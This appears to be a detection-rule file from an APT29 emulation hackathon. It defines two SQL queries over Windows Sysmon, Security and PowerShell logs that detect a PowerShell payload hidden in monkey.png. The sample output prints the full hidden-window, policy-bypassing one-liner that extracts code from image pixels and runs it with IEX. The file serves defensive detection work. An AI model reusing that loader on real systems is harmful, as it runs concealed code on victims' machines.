@@ -1,0 +1,58 @@
+vendor: OTR Community
+step: 3.A.2
+procedure: Embedded PowerShell payload in monkey.png using steganography
+criteria: Evidence that a PowerShell payload was within monkey.png
+technique:
+  name: Obfuscated Files or Information
+  id: T1027
+issue: https://github.com/OTRF/detection-hackathon-apt29/issues/5
+detections:
+  - main_type: Telemetry
+    modifier_type:
+    description: Telemetry showed PowerShell extracting and executing the code embedded within monkey.png.
+    reference:
+    queries:
+      - id: 0F10E1D1-EDF8-4B9F-B879-3651598D528A
+        data_sources:
+          - Microsoft-Windows-Sysmon/Operational
+          - Microsoft-Windows-PowerShell/Operational
+        rule_contribution:
+        logic: |
+          SELECT d.Image, d.CommandLine, c.ScriptBlockText
+          FROM apt29Table c
+          INNER JOIN (
+              SELECT ParentProcessGuid, ProcessGuid, ProcessId, ParentImage, Image, ParentCommandLine, CommandLine
+              FROM apt29Table
+              WHERE Channel = "Microsoft-Windows-Sysmon/Operational"
+                  AND EventID = 1
+              ) d
+          ON c.ExecutionProcessID = d.ProcessId
+          WHERE c.Channel = "Microsoft-Windows-PowerShell/Operational"
+              AND c.EventID = 4104
+              AND LOWER(c.ScriptBlockText) LIKE "%monkey.png%"
+        output: |
+          Image           | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                                                                                                                                                                                                                                                                                                     
+          CommandLine     | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))" 
+          ScriptBlockText | sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))
+      - id: 94F9B4F2-1C52-4A47-BF47-C786513A05AA
+        data_sources:
+          - Security
+          - Microsoft-Windows-PowerShell/Operational
+        rule_contribution:
+        logic: |
+          SELECT d.NewProcessName, d.CommandLine, c.ScriptBlockText
+          FROM apt29Table c
+          INNER JOIN (
+              SELECT NewProcessName, CommandLine, split(NewProcessId, '0x')[1] as NewProcessId
+              FROM apt29Table
+              WHERE LOWER(Channel) = "security"
+                  AND EventID = 4688
+              ) d
+          ON LOWER(hex(c.ExecutionProcessID)) = d.NewProcessId
+          WHERE c.Channel = "Microsoft-Windows-PowerShell/Operational"
+              AND c.EventID = 4104
+              AND LOWER(c.ScriptBlockText) LIKE "%monkey.png%"
+        output: |
+          NewProcessName  | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                                                                                                                                                                                                                                                                                                     
+          CommandLine     | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))" 
+          ScriptBlockText | sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))
